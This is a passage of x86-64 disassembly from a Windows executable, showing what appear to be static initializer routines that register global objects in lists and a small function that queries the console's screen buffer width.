   140001ed5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140001eda:	57                   	push   %rdi
   140001edb:	48 83 ec 60          	sub    $0x60,%rsp
   140001edf:	48 8d 05 6a 45 06 00 	lea    0x6456a(%rip),%rax        # 0x140066450
   140001ee6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001eeb:	48 c7 44 24 38 32 00 	movq   $0x32,0x38(%rsp)
   140001ef2:	00 00 
   140001ef4:	48 8b 05 ed 2f 08 00 	mov    0x82fed(%rip),%rax        # 0x140084ee8
   140001efb:	90                   	nop
   140001efc:	48 85 c0             	test   %rax,%rax
   140001eff:	75 1a                	jne    0x140001f1b
   140001f01:	4c 8d 05 e8 25 02 00 	lea    0x225e8(%rip),%r8        # 0x1400244f0
   140001f08:	48 8d 15 41 24 02 00 	lea    0x22441(%rip),%rdx        # 0x140024350
   140001f0f:	48 8d 0d d2 2f 08 00 	lea    0x82fd2(%rip),%rcx        # 0x140084ee8
   140001f16:	e8 35 32 03 00       	call   0x140035150
   140001f1b:	48 8b 3d c6 2f 08 00 	mov    0x82fc6(%rip),%rdi        # 0x140084ee8
   140001f22:	45 33 c0             	xor    %r8d,%r8d
   140001f25:	33 d2                	xor    %edx,%edx
   140001f27:	48 8d 0d b2 30 08 00 	lea    0x830b2(%rip),%rcx        # 0x140084fe0
   140001f2e:	e8 3d 0b 02 00       	call   0x140022a70
   140001f33:	90                   	nop
   140001f34:	c6 05 25 31 08 00 00 	movb   $0x0,0x83125(%rip)        # 0x140085060
   140001f3b:	48 8d 05 66 45 06 00 	lea    0x64566(%rip),%rax        # 0x1400664a8
   140001f42:	48 89 05 1f 31 08 00 	mov    %rax,0x8311f(%rip)        # 0x140085068
   140001f49:	66 c7 05 1e 31 08 00 	movw   $0x100,0x8311e(%rip)        # 0x140085070
   140001f50:	00 01 
   140001f52:	48 8d 05 67 45 06 00 	lea    0x64567(%rip),%rax        # 0x1400664c0
   140001f59:	48 89 05 80 30 08 00 	mov    %rax,0x83080(%rip)        # 0x140084fe0
   140001f60:	48 8d 05 51 42 06 00 	lea    0x64251(%rip),%rax        # 0x1400661b8
   140001f67:	48 89 05 0a 31 08 00 	mov    %rax,0x8310a(%rip)        # 0x140085078
   140001f6e:	48 8d 05 13 45 06 00 	lea    0x64513(%rip),%rax        # 0x140066488
   140001f75:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001f7a:	48 c7 44 24 28 11 00 	movq   $0x11,0x28(%rsp)
   140001f81:	00 00 
   140001f83:	0f b7 05 60 30 08 00 	movzwl 0x83060(%rip),%eax        # 0x140084fea
   140001f8a:	be 00 40 00 00       	mov    $0x4000,%esi
   140001f8f:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001f94:	66 85 c6             	test   %ax,%si
   140001f97:	74 51                	je     0x140001fea
   140001f99:	66 0f 7f 44 24 40    	movdqa %xmm0,0x40(%rsp)
   140001f9f:	48 8b 05 5a 2f 08 00 	mov    0x82f5a(%rip),%rax        # 0x140084f00
   140001fa6:	90                   	nop
   140001fa7:	48 85 c0             	test   %rax,%rax
   140001faa:	75 1a                	jne    0x140001fc6
   140001fac:	4c 8d 05 3d 24 02 00 	lea    0x2243d(%rip),%r8        # 0x1400243f0
   140001fb3:	48 8d 15 66 22 02 00 	lea    0x22266(%rip),%rdx        # 0x140024220
   140001fba:	48 8d 0d 3f 2f 08 00 	lea    0x82f3f(%rip),%rcx        # 0x140084f00
   140001fc1:	e8 8a 31 03 00       	call   0x140035150
   140001fc6:	48 8b 0d 33 2f 08 00 	mov    0x82f33(%rip),%rcx        # 0x140084f00
   140001fcd:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140001fd2:	48 8d 15 07 30 08 00 	lea    0x83007(%rip),%rdx        # 0x140084fe0
   140001fd9:	e8 52 57 02 00       	call   0x140027730
   140001fde:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140001fe3:	0f b7 05 00 30 08 00 	movzwl 0x83000(%rip),%eax        # 0x140084fea
   140001fea:	b9 bf ff 00 00       	mov    $0xffbf,%ecx
   140001fef:	66 23 c1             	and    %cx,%ax
   140001ff2:	66 83 c8 20          	or     $0x20,%ax
   140001ff6:	0f 10 4c 24 30       	movups 0x30(%rsp),%xmm1
   140001ffb:	66 c7 05 6c 30 08 00 	movw   $0x100,0x8306c(%rip)        # 0x140085070
   140002002:	00 01 
   140002004:	c6 05 55 30 08 00 00 	movb   $0x0,0x83055(%rip)        # 0x140085060
   14000200b:	66 89 05 d8 2f 08 00 	mov    %ax,0x82fd8(%rip)        # 0x140084fea
   140002012:	0f 29 0d e7 2f 08 00 	movaps %xmm1,0x82fe7(%rip)        # 0x140085000
   140002019:	0f 29 05 d0 2f 08 00 	movaps %xmm0,0x82fd0(%rip)        # 0x140084ff0
   140002020:	48 8d 05 59 30 08 00 	lea    0x83059(%rip),%rax        # 0x140085080
   140002027:	48 8b 0d f2 2f 08 00 	mov    0x82ff2(%rip),%rcx        # 0x140085020
   14000202e:	48 8d 1d f3 2e 08 00 	lea    0x82ef3(%rip),%rbx        # 0x140084f28
   140002035:	48 39 01             	cmp    %rax,(%rcx)
   140002038:	75 05                	jne    0x14000203f
   14000203a:	48 89 19             	mov    %rbx,(%rcx)
   14000203d:	eb 61                	jmp    0x1400020a0
   14000203f:	44 8b 05 e2 2f 08 00 	mov    0x82fe2(%rip),%r8d        # 0x140085028
   140002046:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   14000204a:	48 8b c1             	mov    %rcx,%rax
   14000204d:	48 3b ca             	cmp    %rdx,%rcx
   140002050:	74 0e                	je     0x140002060
   140002052:	48 39 18             	cmp    %rbx,(%rax)
   140002055:	74 49                	je     0x1400020a0
   140002057:	48 83 c0 08          	add    $0x8,%rax
   14000205b:	48 3b c2             	cmp    %rdx,%rax
   14000205e:	75 f2                	jne    0x140002052
   140002060:	44 3b 05 c5 2f 08 00 	cmp    0x82fc5(%rip),%r8d        # 0x14008502c
   140002067:	72 2a                	jb     0x140002093
   140002069:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   14000206f:	45 33 c0             	xor    %r8d,%r8d
   140002072:	48 8d 15 b7 2f 08 00 	lea    0x82fb7(%rip),%rdx        # 0x140085030
   140002079:	48 8d 0d a0 2f 08 00 	lea    0x82fa0(%rip),%rcx        # 0x140085020
   140002080:	e8 7b e5 01 00       	call   0x140020600
   140002085:	44 8b 05 9c 2f 08 00 	mov    0x82f9c(%rip),%r8d        # 0x140085028
   14000208c:	48 8b 0d 8d 2f 08 00 	mov    0x82f8d(%rip),%rcx        # 0x140085020
   140002093:	41 8b c0             	mov    %r8d,%eax
   140002096:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   14000209a:	ff 05 88 2f 08 00    	incl   0x82f88(%rip)        # 0x140085028
   1400020a0:	4c 8b c7             	mov    %rdi,%r8
   1400020a3:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400020a8:	48 8d 0d 89 2f 08 00 	lea    0x82f89(%rip),%rcx        # 0x140085038
   1400020af:	e8 5c 2b 02 00       	call   0x140024c10
   1400020b4:	48 8b 05 45 2e 08 00 	mov    0x82e45(%rip),%rax        # 0x140084f00
   1400020bb:	90                   	nop
   1400020bc:	48 85 c0             	test   %rax,%rax
   1400020bf:	75 1a                	jne    0x1400020db
   1400020c1:	4c 8d 05 28 23 02 00 	lea    0x22328(%rip),%r8        # 0x1400243f0
   1400020c8:	48 8d 15 51 21 02 00 	lea    0x22151(%rip),%rdx        # 0x140024220
   1400020cf:	48 8d 0d 2a 2e 08 00 	lea    0x82e2a(%rip),%rcx        # 0x140084f00
   1400020d6:	e8 75 30 03 00       	call   0x140035150
   1400020db:	48 8b 0d 1e 2e 08 00 	mov    0x82e1e(%rip),%rcx        # 0x140084f00
   1400020e2:	45 33 c0             	xor    %r8d,%r8d
   1400020e5:	48 8d 15 f4 2e 08 00 	lea    0x82ef4(%rip),%rdx        # 0x140084fe0
   1400020ec:	e8 9f 1f 02 00       	call   0x140024090
   1400020f1:	66 09 35 f2 2e 08 00 	or     %si,0x82ef2(%rip)        # 0x140084fea
   1400020f8:	48 8d 0d 21 05 06 00 	lea    0x60521(%rip),%rcx        # 0x140062620
   1400020ff:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002104:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140002109:	48 83 c4 60          	add    $0x60,%rsp
   14000210d:	5f                   	pop    %rdi
   14000210e:	e9 11 a0 03 00       	jmp    0x14003c124
   140002113:	cc                   	int3
   140002114:	cc                   	int3
   140002115:	cc                   	int3
   140002116:	cc                   	int3
   140002117:	cc                   	int3
   140002118:	cc                   	int3
   140002119:	cc                   	int3
   14000211a:	cc                   	int3
   14000211b:	cc                   	int3
   14000211c:	cc                   	int3
   14000211d:	cc                   	int3
   14000211e:	cc                   	int3
   14000211f:	cc                   	int3
   140002120:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002125:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000212a:	57                   	push   %rdi
   14000212b:	48 83 ec 60          	sub    $0x60,%rsp
   14000212f:	48 8d 05 d2 42 06 00 	lea    0x642d2(%rip),%rax        # 0x140066408
   140002136:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000213b:	48 c7 44 24 38 34 00 	movq   $0x34,0x38(%rsp)
   140002142:	00 00 
   140002144:	48 8b 05 9d 2d 08 00 	mov    0x82d9d(%rip),%rax        # 0x140084ee8
   14000214b:	90                   	nop
   14000214c:	48 85 c0             	test   %rax,%rax
   14000214f:	75 1a                	jne    0x14000216b
   140002151:	4c 8d 05 98 23 02 00 	lea    0x22398(%rip),%r8        # 0x1400244f0
   140002158:	48 8d 15 f1 21 02 00 	lea    0x221f1(%rip),%rdx        # 0x140024350
   14000215f:	48 8d 0d 82 2d 08 00 	lea    0x82d82(%rip),%rcx        # 0x140084ee8
   140002166:	e8 e5 2f 03 00       	call   0x140035150
   14000216b:	48 8b 3d 76 2d 08 00 	mov    0x82d76(%rip),%rdi        # 0x140084ee8
   140002172:	45 33 c0             	xor    %r8d,%r8d
   140002175:	33 d2                	xor    %edx,%edx
   140002177:	48 8d 0d a2 30 08 00 	lea    0x830a2(%rip),%rcx        # 0x140085220
   14000217e:	e8 ed 08 02 00       	call   0x140022a70
   140002183:	90                   	nop
   140002184:	c6 05 15 31 08 00 00 	movb   $0x0,0x83115(%rip)        # 0x1400852a0
   14000218b:	48 8d 05 16 43 06 00 	lea    0x64316(%rip),%rax        # 0x1400664a8
   140002192:	48 89 05 0f 31 08 00 	mov    %rax,0x8310f(%rip)        # 0x1400852a8
   140002199:	66 c7 05 0e 31 08 00 	movw   $0x100,0x8310e(%rip)        # 0x1400852b0
   1400021a0:	00 01 
   1400021a2:	48 8d 05 17 43 06 00 	lea    0x64317(%rip),%rax        # 0x1400664c0
   1400021a9:	48 89 05 70 30 08 00 	mov    %rax,0x83070(%rip)        # 0x140085220
   1400021b0:	48 8d 05 01 40 06 00 	lea    0x64001(%rip),%rax        # 0x1400661b8
   1400021b7:	48 89 05 fa 30 08 00 	mov    %rax,0x830fa(%rip)        # 0x1400852b8
   1400021be:	48 8d 05 7b 42 06 00 	lea    0x6427b(%rip),%rax        # 0x140066440
   1400021c5:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400021ca:	48 c7 44 24 28 0d 00 	movq   $0xd,0x28(%rsp)
   1400021d1:	00 00 
   1400021d3:	0f b7 05 50 30 08 00 	movzwl 0x83050(%rip),%eax        # 0x14008522a
   1400021da:	be 00 40 00 00       	mov    $0x4000,%esi
   1400021df:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   1400021e4:	66 85 c6             	test   %ax,%si
   1400021e7:	74 51                	je     0x14000223a
   1400021e9:	66 0f 7f 44 24 40    	movdqa %xmm0,0x40(%rsp)
   1400021ef:	48 8b 05 0a 2d 08 00 	mov    0x82d0a(%rip),%rax        # 0x140084f00
   1400021f6:	90                   	nop
   1400021f7:	48 85 c0             	test   %rax,%rax
   1400021fa:	75 1a                	jne    0x140002216
   1400021fc:	4c 8d 05 ed 21 02 00 	lea    0x221ed(%rip),%r8        # 0x1400243f0
   140002203:	48 8d 15 16 20 02 00 	lea    0x22016(%rip),%rdx        # 0x140024220
   14000220a:	48 8d 0d ef 2c 08 00 	lea    0x82cef(%rip),%rcx        # 0x140084f00
   140002211:	e8 3a 2f 03 00       	call   0x140035150
   140002216:	48 8b 0d e3 2c 08 00 	mov    0x82ce3(%rip),%rcx        # 0x140084f00
   14000221d:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140002222:	48 8d 15 f7 2f 08 00 	lea    0x82ff7(%rip),%rdx        # 0x140085220
   140002229:	e8 02 55 02 00       	call   0x140027730
   14000222e:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   140002233:	0f b7 05 f0 2f 08 00 	movzwl 0x82ff0(%rip),%eax        # 0x14008522a
   14000223a:	b9 bf ff 00 00       	mov    $0xffbf,%ecx
   14000223f:	66 23 c1             	and    %cx,%ax
   140002242:	66 83 c8 20          	or     $0x20,%ax
   140002246:	0f 10 4c 24 30       	movups 0x30(%rsp),%xmm1
   14000224b:	66 c7 05 5c 30 08 00 	movw   $0x100,0x8305c(%rip)        # 0x1400852b0
   140002252:	00 01 
   140002254:	c6 05 45 30 08 00 00 	movb   $0x0,0x83045(%rip)        # 0x1400852a0
   14000225b:	66 89 05 c8 2f 08 00 	mov    %ax,0x82fc8(%rip)        # 0x14008522a
   140002262:	0f 29 0d d7 2f 08 00 	movaps %xmm1,0x82fd7(%rip)        # 0x140085240
   140002269:	0f 29 05 c0 2f 08 00 	movaps %xmm0,0x82fc0(%rip)        # 0x140085230
   140002270:	48 8d 05 09 2e 08 00 	lea    0x82e09(%rip),%rax        # 0x140085080
   140002277:	48 8b 0d e2 2f 08 00 	mov    0x82fe2(%rip),%rcx        # 0x140085260
   14000227e:	48 8d 1d a3 2c 08 00 	lea    0x82ca3(%rip),%rbx        # 0x140084f28
   140002285:	48 39 01             	cmp    %rax,(%rcx)
   140002288:	75 05                	jne    0x14000228f
   14000228a:	48 89 19             	mov    %rbx,(%rcx)
   14000228d:	eb 61                	jmp    0x1400022f0
   14000228f:	44 8b 05 d2 2f 08 00 	mov    0x82fd2(%rip),%r8d        # 0x140085268
   140002296:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   14000229a:	48 8b c1             	mov    %rcx,%rax
   14000229d:	48 3b ca             	cmp    %rdx,%rcx
   1400022a0:	74 0e                	je     0x1400022b0
   1400022a2:	48 39 18             	cmp    %rbx,(%rax)
   1400022a5:	74 49                	je     0x1400022f0
   1400022a7:	48 83 c0 08          	add    $0x8,%rax
   1400022ab:	48 3b c2             	cmp    %rdx,%rax
   1400022ae:	75 f2                	jne    0x1400022a2
   1400022b0:	44 3b 05 b5 2f 08 00 	cmp    0x82fb5(%rip),%r8d        # 0x14008526c
   1400022b7:	72 2a                	jb     0x1400022e3
   1400022b9:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   1400022bf:	45 33 c0             	xor    %r8d,%r8d
   1400022c2:	48 8d 15 a7 2f 08 00 	lea    0x82fa7(%rip),%rdx        # 0x140085270
   1400022c9:	48 8d 0d 90 2f 08 00 	lea    0x82f90(%rip),%rcx        # 0x140085260
   1400022d0:	e8 2b e3 01 00       	call   0x140020600
   1400022d5:	44 8b 05 8c 2f 08 00 	mov    0x82f8c(%rip),%r8d        # 0x140085268
   1400022dc:	48 8b 0d 7d 2f 08 00 	mov    0x82f7d(%rip),%rcx        # 0x140085260
   1400022e3:	41 8b c0             	mov    %r8d,%eax
   1400022e6:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   1400022ea:	ff 05 78 2f 08 00    	incl   0x82f78(%rip)        # 0x140085268
   1400022f0:	4c 8b c7             	mov    %rdi,%r8
   1400022f3:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1400022f8:	48 8d 0d 79 2f 08 00 	lea    0x82f79(%rip),%rcx        # 0x140085278
   1400022ff:	e8 0c 29 02 00       	call   0x140024c10
   140002304:	48 8b 05 f5 2b 08 00 	mov    0x82bf5(%rip),%rax        # 0x140084f00
   14000230b:	90                   	nop
   14000230c:	48 85 c0             	test   %rax,%rax
   14000230f:	75 1a                	jne    0x14000232b
   140002311:	4c 8d 05 d8 20 02 00 	lea    0x220d8(%rip),%r8        # 0x1400243f0
   140002318:	48 8d 15 01 1f 02 00 	lea    0x21f01(%rip),%rdx        # 0x140024220
   14000231f:	48 8d 0d da 2b 08 00 	lea    0x82bda(%rip),%rcx        # 0x140084f00
   140002326:	e8 25 2e 03 00       	call   0x140035150
   14000232b:	48 8b 0d ce 2b 08 00 	mov    0x82bce(%rip),%rcx        # 0x140084f00
   140002332:	45 33 c0             	xor    %r8d,%r8d
   140002335:	48 8d 15 e4 2e 08 00 	lea    0x82ee4(%rip),%rdx        # 0x140085220
   14000233c:	e8 4f 1d 02 00       	call   0x140024090
   140002341:	66 09 35 e2 2e 08 00 	or     %si,0x82ee2(%rip)        # 0x14008522a
   140002348:	48 8d 0d 21 03 06 00 	lea    0x60321(%rip),%rcx        # 0x140062670
   14000234f:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   140002354:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi
   140002359:	48 83 c4 60          	add    $0x60,%rsp
   14000235d:	5f                   	pop    %rdi
   14000235e:	e9 c1 9d 03 00       	jmp    0x14003c124
   140002363:	cc                   	int3
   140002364:	cc                   	int3
   140002365:	cc                   	int3
   140002366:	cc                   	int3
   140002367:	cc                   	int3
   140002368:	cc                   	int3
   140002369:	cc                   	int3
   14000236a:	cc                   	int3
   14000236b:	cc                   	int3
   14000236c:	cc                   	int3
   14000236d:	cc                   	int3
   14000236e:	cc                   	int3
   14000236f:	cc                   	int3
   140002370:	48 8d 0d 49 03 06 00 	lea    0x60349(%rip),%rcx        # 0x1400626c0
   140002377:	e9 a8 9d 03 00       	jmp    0x14003c124
   14000237c:	cc                   	int3
   14000237d:	cc                   	int3
   14000237e:	cc                   	int3
   14000237f:	cc                   	int3
   140002380:	48 8d 0d 49 03 06 00 	lea    0x60349(%rip),%rcx        # 0x1400626d0
   140002387:	e9 98 9d 03 00       	jmp    0x14003c124
   14000238c:	cc                   	int3
   14000238d:	cc                   	int3
   14000238e:	cc                   	int3
   14000238f:	cc                   	int3
   140002390:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002395:	57                   	push   %rdi
   140002396:	48 83 ec 60          	sub    $0x60,%rsp
   14000239a:	48 8d 05 df 41 06 00 	lea    0x641df(%rip),%rax        # 0x140066580
   1400023a1:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400023a6:	48 c7 44 24 48 23 00 	movq   $0x23,0x48(%rsp)
   1400023ad:	00 00 
   1400023af:	45 33 c0             	xor    %r8d,%r8d
   1400023b2:	33 d2                	xor    %edx,%edx
   1400023b4:	48 8d 0d 45 30 08 00 	lea    0x83045(%rip),%rcx        # 0x140085400
   1400023bb:	e8 b0 06 02 00       	call   0x140022a70
   1400023c0:	90                   	nop
   1400023c1:	33 db                	xor    %ebx,%ebx
   1400023c3:	8b cb                	mov    %ebx,%ecx
   1400023c5:	48 89 1d b4 30 08 00 	mov    %rbx,0x830b4(%rip)        # 0x140085480
   1400023cc:	48 8d 05 45 41 06 00 	lea    0x64145(%rip),%rax        # 0x140066518
   1400023d3:	48 89 05 ae 30 08 00 	mov    %rax,0x830ae(%rip)        # 0x140085488
   1400023da:	48 8d 05 4f 41 06 00 	lea    0x6414f(%rip),%rax        # 0x140066530
   1400023e1:	48 89 05 18 30 08 00 	mov    %rax,0x83018(%rip)        # 0x140085400
   1400023e8:	48 8d 05 c9 3d 06 00 	lea    0x63dc9(%rip),%rax        # 0x1400661b8
   1400023ef:	48 89 05 9a 30 08 00 	mov    %rax,0x8309a(%rip)        # 0x140085490
   1400023f6:	48 8d 05 ab 41 06 00 	lea    0x641ab(%rip),%rax        # 0x1400665a8
   1400023fd:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140002402:	48 c7 44 24 28 07 00 	movq   $0x7,0x28(%rsp)
   140002409:	00 00 
   14000240b:	0f b7 05 f8 2f 08 00 	movzwl 0x82ff8(%rip),%eax        # 0x14008540a
   140002412:	bf 00 40 00 00       	mov    $0x4000,%edi
   140002417:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   14000241c:	66 85 c7             	test   %ax,%di
   14000241f:	74 58                	je     0x140002479
   140002421:	66 0f 7f 44 24 50    	movdqa %xmm0,0x50(%rsp)
   140002427:	48 8b 05 d2 2a 08 00 	mov    0x82ad2(%rip),%rax        # 0x140084f00
   14000242e:	90                   	nop
   14000242f:	48 85 c0             	test   %rax,%rax
   140002432:	75 1a                	jne    0x14000244e
   140002434:	4c 8d 05 b5 1f 02 00 	lea    0x21fb5(%rip),%r8        # 0x1400243f0
   14000243b:	48 8d 15 de 1d 02 00 	lea    0x21dde(%rip),%rdx        # 0x140024220
   140002442:	48 8d 0d b7 2a 08 00 	lea    0x82ab7(%rip),%rcx        # 0x140084f00
   140002449:	e8 02 2d 03 00       	call   0x140035150
   14000244e:	48 8b 0d ab 2a 08 00 	mov    0x82aab(%rip),%rcx        # 0x140084f00
   140002455:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   14000245a:	48 8d 15 9f 2f 08 00 	lea    0x82f9f(%rip),%rdx        # 0x140085400
   140002461:	e8 ca 52 02 00       	call   0x140027730
   140002466:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
   14000246b:	48 8b 0d 0e 30 08 00 	mov    0x8300e(%rip),%rcx        # 0x140085480
   140002472:	0f b7 05 91 2f 08 00 	movzwl 0x82f91(%rip),%eax        # 0x14008540a
   140002479:	0f 29 05 90 2f 08 00 	movaps %xmm0,0x82f90(%rip)        # 0x140085410
   140002480:	0f 10 44 24 40       	movups 0x40(%rsp),%xmm0
   140002485:	0f 29 05 94 2f 08 00 	movaps %xmm0,0x82f94(%rip)        # 0x140085420
   14000248c:	48 85 c9             	test   %rcx,%rcx
   14000248f:	74 44                	je     0x1400024d5
   140002491:	66 c7 44 24 30 03 01 	movw   $0x103,0x30(%rsp)
   140002498:	48 8d 05 49 3c 06 00 	lea    0x63c49(%rip),%rax        # 0x1400660e8
   14000249f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400024a4:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400024a9:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   1400024ae:	e8 ad 37 03 00       	call   0x140035c60
   1400024b3:	4c 8b c8             	mov    %rax,%r9
   1400024b6:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400024bb:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400024c0:	48 8d 0d 39 2f 08 00 	lea    0x82f39(%rip),%rcx        # 0x140085400
   1400024c7:	e8 54 23 02 00       	call   0x140024820
   1400024cc:	0f b7 05 37 2f 08 00 	movzwl 0x82f37(%rip),%eax        # 0x14008540a
   1400024d3:	eb 0e                	jmp    0x1400024e3
   1400024d5:	48 8d 0d 44 2a 08 00 	lea    0x82a44(%rip),%rcx        # 0x140084f20
   1400024dc:	48 89 0d 9d 2f 08 00 	mov    %rcx,0x82f9d(%rip)        # 0x140085480
   1400024e3:	66 83 c8 18          	or     $0x18,%ax
   1400024e7:	66 89 05 1c 2f 08 00 	mov    %ax,0x82f1c(%rip)        # 0x14008540a
   1400024ee:	48 8d 05 8b 2b 08 00 	lea    0x82b8b(%rip),%rax        # 0x140085080
   1400024f5:	48 8b 0d 44 2f 08 00 	mov    0x82f44(%rip),%rcx        # 0x140085440
   1400024fc:	48 8d 1d 25 2a 08 00 	lea    0x82a25(%rip),%rbx        # 0x140084f28
   140002503:	48 39 01             	cmp    %rax,(%rcx)
   140002506:	75 05                	jne    0x14000250d
   140002508:	48 89 19             	mov    %rbx,(%rcx)
   14000250b:	eb 61                	jmp    0x14000256e
   14000250d:	44 8b 05 34 2f 08 00 	mov    0x82f34(%rip),%r8d        # 0x140085448
   140002514:	4a 8d 14 c1          	lea    (%rcx,%r8,8),%rdx
   140002518:	48 8b c1             	mov    %rcx,%rax
   14000251b:	48 3b ca             	cmp    %rdx,%rcx
   14000251e:	74 0e                	je     0x14000252e
   140002520:	48 39 18             	cmp    %rbx,(%rax)
   140002523:	74 49                	je     0x14000256e
   140002525:	48 83 c0 08          	add    $0x8,%rax
   140002529:	48 3b c2             	cmp    %rdx,%rax
   14000252c:	75 f2                	jne    0x140002520
   14000252e:	44 3b 05 17 2f 08 00 	cmp    0x82f17(%rip),%r8d        # 0x14008544c
   140002535:	72 2a                	jb     0x140002561
   140002537:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   14000253d:	45 33 c0             	xor    %r8d,%r8d
   140002540:	48 8d 15 09 2f 08 00 	lea    0x82f09(%rip),%rdx        # 0x140085450
   140002547:	48 8d 0d f2 2e 08 00 	lea    0x82ef2(%rip),%rcx        # 0x140085440
   14000254e:	e8 ad e0 01 00       	call   0x140020600
   140002553:	44 8b 05 ee 2e 08 00 	mov    0x82eee(%rip),%r8d        # 0x140085448
   14000255a:	48 8b 0d df 2e 08 00 	mov    0x82edf(%rip),%rcx        # 0x140085440
   140002561:	41 8b c0             	mov    %r8d,%eax
   140002564:	48 89 1c c1          	mov    %rbx,(%rcx,%rax,8)
   140002568:	ff 05 da 2e 08 00    	incl   0x82eda(%rip)        # 0x140085448
   14000256e:	48 8b 05 8b 29 08 00 	mov    0x8298b(%rip),%rax        # 0x140084f00
   140002575:	90                   	nop
   140002576:	48 85 c0             	test   %rax,%rax
   140002579:	75 1a                	jne    0x140002595
   14000257b:	4c 8d 05 6e 1e 02 00 	lea    0x21e6e(%rip),%r8        # 0x1400243f0
   140002582:	48 8d 15 97 1c 02 00 	lea    0x21c97(%rip),%rdx        # 0x140024220
   140002589:	48 8d 0d 70 29 08 00 	lea    0x82970(%rip),%rcx        # 0x140084f00
   140002590:	e8 bb 2b 03 00       	call   0x140035150
   140002595:	48 8b 0d 64 29 08 00 	mov    0x82964(%rip),%rcx        # 0x140084f00
   14000259c:	45 33 c0             	xor    %r8d,%r8d
   14000259f:	48 8d 15 5a 2e 08 00 	lea    0x82e5a(%rip),%rdx        # 0x140085400
   1400025a6:	e8 e5 1a 02 00       	call   0x140024090
   1400025ab:	66 09 3d 58 2e 08 00 	or     %di,0x82e58(%rip)        # 0x14008540a
   1400025b2:	48 8d 0d 27 01 06 00 	lea    0x60127(%rip),%rcx        # 0x1400626e0
   1400025b9:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1400025be:	48 83 c4 60          	add    $0x60,%rsp
   1400025c2:	5f                   	pop    %rdi
   1400025c3:	e9 5c 9b 03 00       	jmp    0x14003c124
   1400025c8:	cc                   	int3
   1400025c9:	cc                   	int3
   1400025ca:	cc                   	int3
   1400025cb:	cc                   	int3
   1400025cc:	cc                   	int3
   1400025cd:	cc                   	int3
   1400025ce:	cc                   	int3
   1400025cf:	cc                   	int3
   1400025d0:	48 83 ec 48          	sub    $0x48,%rsp
   1400025d4:	48 8b 05 1d 0d 08 00 	mov    0x80d1d(%rip),%rax        # 0x1400832f8
   1400025db:	48 33 c4             	xor    %rsp,%rax
   1400025de:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400025e3:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   1400025e8:	ff 15 52 0a 06 00    	call   *0x60a52(%rip)        # 0x140063040
   1400025ee:	48 8b c8             	mov    %rax,%rcx
   1400025f1:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400025f6:	ff 15 14 0b 06 00    	call   *0x60b14(%rip)        # 0x140063110
   1400025fc:	85 c0                	test   %eax,%eax
   1400025fe:	74 07                	je     0x140002607
   140002600:	0f b7 44 24 28       	movzwl 0x28(%rsp),%eax
   140002605:	eb 02                	jmp    0x140002609
   140002607:	33 c0                	xor    %eax,%eax
   140002609:	66 89 05 88 2e 08 00 	mov    %ax,0x82e88(%rip)        # 0x140085498
   140002610:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140002615:	48 33 cc             	xor    %rsp,%rcx
   140002618:	e8 e3 93 03 00       	call   0x14003ba00
   14000261d:	48 83 c4 48          	add    $0x48,%rsp
   140002621:	c3                   	ret
   140002622:	cc                   	int3
   140002623:	cc                   	int3
   140002624:	cc                   	int3
   140002625:	cc                   	int3
   140002626:	cc                   	int3
   140002627:	cc                   	int3
   140002628:	cc                   	int3
   140002629:	cc                   	int3
   14000262a:	cc                   	int3
   14000262b:	cc                   	int3
   14000262c:	cc                   	int3
   14000262d:	cc                   	int3
   14000262e:	cc                   	int3
   14000262f:	cc                   	int3
   140002630:	48 83 ec 28          	sub    $0x28,%rsp
   140002634:	ba 02 00 00 00       	mov    $0x2,%edx
   140002639:	48 8d 0d c0 2e 08 00 	lea    0x82ec0(%rip),%rcx        # 0x140085500
   140002640:	e8 7b 8a 03 00       	call   0x14003b0c0
   140002645:	48 8d 0d e4 00 06 00 	lea    0x600e4(%rip),%rcx        # 0x140062730
   14000264c:	48 83 c4 28          	add    $0x28,%rsp
   140002650:	e9 cf 9a 03 00       	jmp    0x14003c124
   140002655:	cc                   	int3
   140002656:	cc                   	int3
   140002657:	cc                   	int3
   140002658:	cc                   	int3
   140002659:	cc                   	int3
   14000265a:	cc                   	int3
   14000265b:	cc                   	int3
   14000265c:	cc                   	int3
   14000265d:	cc                   	int3
   14000265e:	cc                   	int3
